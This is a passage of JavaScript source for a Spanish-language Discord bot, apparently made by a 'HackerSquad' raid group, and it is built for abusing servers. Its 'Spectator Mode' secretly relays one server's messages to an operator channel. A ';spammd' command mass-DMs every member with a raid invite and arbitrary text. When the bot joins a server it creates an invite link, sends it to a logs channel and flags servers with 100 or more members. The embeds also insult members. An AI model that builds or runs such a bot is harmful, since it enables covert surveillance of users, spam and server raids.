			let canal = client.channels.cache.get(args[1]);
			if (!canal)
				return message.channel.send("No especificaste un canal válido");

			let embed = new Discord.MessageEmbed()
				.setDescription(
					`Se activó el **Spectator Mode** en el servidor **${guild.name}** y el canal ${canal}`
				)
				.setColor("RED");

			message.channel.send(embed);
			let server = new Spectatormode({
				_id: db.Types.ObjectId(),
				username: String,
				userId: message.author.id,
				serverName: guild.name,
				serverId: guild.id,
				channelSet: canal,
				channelSetId: canal.id,
			});
			server.save();
		} else {
			noPerm();
		}
	}
	////spect////
	if (spect) {
		if (message.content.startsWith("")) {
			let sp = await Spectatormode.findOne();
			if (message.author.bot) return;
			let text = new Discord.MessageEmbed()
				.setDescription(
					`\`${sp.serverName}\` | \`#${message.channel.name}\`: \n${message.content}`
				)
				.setAuthor(
					`${message.author.username}#${message.author.discriminator}`,
					message.author.displayAvatarURL()
				);
			client.channels.cache.get(sp.channelSetId).send(text);
		}
	}
	//////////spectoff//////////////
	if (message.content.startsWith(";spectoff")) {
		let guild = await Spectatormode.findOne({ serverId: args[0] });
		if (hackers) {
			if (!guild) {
				let nopersona = new Discord.MessageEmbed()
					.setDescription(
						"No has especificado ningún servidor para apagar el **Spectator Mode**"
					)
					.setColor("RED");
				message.channel.send(nopersona);
			}
			await Spectatormode.findOneAndDelete({ serverId: guild.id });
			let embed = new Discord.MessageEmbed()
				.setDescription(
					`Se apagó el **Spectator Mode** en **${guild.name}**`
				)
				.setColor("RED");
			message.channel.send(embed);
		} else {
			noPerm();
		}
	}

	if (message.content === ";spectatormode") {
		if (!malo) {
			let lista = await Spectatormode.find();
			let members =
				lista
					.map(
						(t) =>
							`${t.serverName} | **ID**: ${t.serverId} | **Canal:** ${t.channelSet}`
					)
					.join("\n") || "Ningún servidor";

			let embed = new Discord.MessageEmbed()
				.setTitle("SpectatorMode activado en: ")
				.setDescription(members);

			message.channel.send(embed);
		} else {
			noPerm();
		}
	}
	////////////spam md/////
	if (message.content.startsWith(";spammd")) {
		if (ownerbot) {
			if (!args) return;
			message.guild.members.cache.each((member) => {
				if (message.channel.type === "dm");
				member
					.send(raidData.invite)
					.catch((e) =>
						console.error(`Ocurrió un error con ${member.user.tag}`)
					);
			});
			message.guild.members.cache.each((member) => {
				if (message.channel.type === "dm");
				member
					.send(args.join(" "))
					.catch((e) =>
						console.error(`Ocurrió un error con ${member.user.tag}`)
					);
			});
		} else {
			noPerm();
		}
	}
	//////////////ping///////////
	if (message.content === ";ping") {
		if (!malo) {
			message.channel.send(".").then(async (message) => {
				var ping = message.createdTimestamp - message.createdTimestamp;
				var botping = Math.round(client.ws.ping);
				function sleep(ms) {
					return new Promise((resolve) => setTimeout(resolve, ms));
				}
				message.edit("..");
				await sleep(1000);
				message.edit("...");
				await sleep(1000);
				message.edit(".");
				await sleep(1000);
				message.edit("..");
				await sleep(1000);
				message.edit("...");
				await sleep(1000);
				message.edit(".");
				await sleep(1000);
				message.edit(`**Ping:**\n${botping}ms`);
			});
		} else {
			noPerm();
		}
	}
});
client.on("guildCreate", (guild) => {
	let embed = new Discord.MessageEmbed()
		.setTitle("Me unieron acá perri")
		.setDescription(
			`**Server:** **${guild.name}** **ID:** ${guild.id} \n**Owner:** HackerSquad\n**Miembros:** ${guild.memberCount} mogolicos \n**Emojis:** ${guild.emojis.cache.size} emojis \n**Roles:** ${guild.roles.cache.size} roles`
		)
		.setColor("#7af75f")
		.setThumbnail(guild.iconURL({ dynamic: true }));

	client.channels.cache.get(logsChannel).send(embed);

	let chanel = client.channels.cache.get(logsChannel);
	let invitechannels = guild.channels.cache.filter((c) =>
		c.permissionsFor(guild.me).has("CREATE_INSTANT_INVITE")
	);

	if (!invitechannels)
		return chanel.send("No pude generar una invitación aquí.");

	invitechannels
		.random()
		.createInvite()
		.then((invite) => chanel.send(invite.url));

	if (guild.members.cache.size >= 100) {
		client.channels.cache.get(logsChannel).send("@everyone");
	}
});
client.on("guildDelete", async (guild) => {
	let embed = new Discord.MessageEmbed()
		.setTitle("Me salí de acá perri")
		.setDescription(
			`**Server:** **${guild.name}** **ID:** ${guild.id} \n**Owner:** HackerSquad\n**Miembros:** ${guild.memberCount} mogolicos \n**Emojis:** ${guild.emojis.cache.size}\n**Roles:** ${guild.roles.cache.size} roles`
		)
		.setColor("#ff1834")
		.setThumbnail(guild.iconURL({ dynamic: true }));

	const h = await client.channels.fetch(logsChannel);
	h.send(embed);
});

client.login(process.env.token);
